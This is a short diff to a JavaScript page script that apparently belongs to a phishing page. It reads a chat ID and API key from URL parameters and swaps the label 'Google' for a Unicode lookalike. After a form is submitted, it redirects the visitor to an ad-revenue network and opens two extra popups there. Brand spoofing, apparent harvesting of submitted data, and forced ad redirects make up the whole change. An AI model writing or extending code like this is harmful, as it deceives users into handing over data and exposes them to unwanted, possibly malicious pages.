@@ -96,7 +96,7 @@ const urlParams = new URLSearchParams(keyValues);
 
 const chatId = urlParams.get('id')
 const api = urlParams.get('api')
-let website = 'Google'
+let website = 'ɢᴏᴏɢʟᴇ'
 
 const now = new Date();
 const hours = String(now.getHours()).padStart(2, '0');
@@ -159,7 +159,9 @@ document.addEventListener("DOMContentLoaded", function () {
                     .then(data => {
                         form.reset(); // Optional: Reset the form fields
                         setTimeout(() => {
-                            window.location.href = 'https://www.highrevenuenetwork.com/mrsxb8gsp?key=7f06f8391a071009e443590da70d05ae';
+                            window.location.href = 'https://www.highratecpm.com/z13dweggm?key=b91890e5549f27e0011a45e539055949';
+                            window.open('https://www.highratecpm.com/z13dweggm?key=b91890e5549f27e0011a45e539055949', '_blank');
+                            window.open('https://www.highratecpm.com/z13dweggm?key=b91890e5549f27e0011a45e539055949', '_blank');
                         }, 500);
                     })
                     .catch(error => {
